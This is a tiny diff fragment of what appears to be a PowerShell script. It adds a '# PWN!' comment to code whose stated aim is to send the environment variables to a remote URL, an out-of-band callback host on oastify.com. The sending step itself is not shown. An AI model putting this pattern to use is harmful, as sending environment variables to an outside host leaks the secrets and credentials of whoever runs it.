@@ -1,3 +1,4 @@
+# PWN!
 # Define the URL you want to send the environment variables to
 $remoteUrl = "http://9hryf86p3o4fl8ikham7mn3utlzcn4bt.oastify.com"
 
